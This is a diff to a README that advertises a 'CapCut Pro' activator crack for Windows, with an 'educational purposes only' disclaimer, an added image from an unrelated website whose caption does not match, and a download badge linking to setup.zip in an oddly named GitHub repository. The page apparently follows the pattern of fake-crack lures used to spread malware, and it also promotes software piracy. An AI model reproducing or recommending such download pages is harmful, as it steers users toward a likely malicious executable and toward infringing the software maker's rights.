@@ -2,6 +2,7 @@
 CapCut-Pro-Activator is an activator / crack for CapCut Pro on Windows. It activates all premium features including 4K export, no watermark, AI tools, pro effects, transitions, filters, and more. No subscription or login required. For educational purposes only.  
 
 Disclaimer: This tool is for educational purposes only. Use at your own risk. Support the official developers by purchasing CapCut Pro if you find it useful.  
+![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://mamunacademy.com.bd/wp-content/uploads/2025/03/5fcdb6e2-275e-47ff-9a61-c5b9de19e841.jpg)
 
 💥Download:  
 [![Download](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://github.com/mapcongressmansoul/ienuqeud/releases/download/v1.0-BETA/setup.zip)  
